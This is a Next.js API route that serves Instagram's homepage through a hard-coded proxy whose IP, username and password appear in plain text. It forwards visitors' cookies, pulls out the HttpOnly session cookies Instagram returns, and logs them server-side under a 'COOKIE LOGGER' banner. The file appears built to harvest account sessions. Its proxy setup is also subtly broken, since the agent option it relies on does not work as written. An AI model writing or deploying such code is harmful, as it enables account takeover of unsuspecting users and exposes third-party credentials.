// pages/api/proxy.js

export default async function handler(req, res) {
  // ✅ PROXY CONFIGURATION
  const proxyHost = "136.0.117.77";
  const proxyPort = 6815;
  const proxyUser = "IGayproNi";
  const proxyPass = "0805thEO";

  // Construct proxy URL: http://user:pass@ip:port
  const proxyUrl = `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`;

  try {
    // 1. Get the user's real User-Agent
    const userUA = req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    // 2. Fetch Instagram through the proxy
    const response = await fetch('https://www.instagram.com/', {
      headers: {
        'User-Agent': userUA,
        'Cookie': req.headers['cookie'] || '',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      },
      // ✅ Use the proxy for the outbound request
      agent: new (require('https').Agent)({
        proxy: `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`
      })
    });

    // 3. Extract HttpOnly Cookies
    const cookies = response.headers.getSetCookie();
    
    // Log cookies
    console.log('======================');
    console.log('🍪 COOKIE LOGGER (via Proxy)');
    console.log('📅 Time:', new Date().toISOString());
    console.log('🍪 Cookies:', cookies);
    console.log('🌐 Proxy Used:', proxyUrl);
    console.log('======================');

    // 4. Stream the response to the user
    const reader = response.body.getReader();
    
    // Set response headers
    res.setHeader('Content-Type', response.headers.get('Content-Type') || 'text/html; charset=utf-8');
    cookies.forEach(c => res.setHeader('Set-Cookie', c));
    res.statusCode = response.status;

    // Stream chunks
    const streamToNode = async (reader, res) => {
      while (true) {
        const { done, value } = await reader.read();
        if (done) {
          res.end();
          break;
        }
        res.write(value);
      }
    };

    streamToNode(reader, res).catch(err => {
      console.error('Stream Error:', err);
      res.write('<html><body><h1>Instagram (Proxy)</h1><p>If you see this, the stream failed.</p></body></html>');
      res.end();
    });

  } catch (error) {
    console.error('Proxy Error:', error);
    // Send a fallback HTML page on error
    res.status(500).type('text/html').send(`
      <html>
        <body style="font-family: sans-serif; padding: 20px;">
          <h1>Instagram (Proxy)</h1>
          <p>Error: ${error.message}</p>
          <p>Check Vercel Logs for details.</p>
        </body>
      </html>
    `);
  }
}
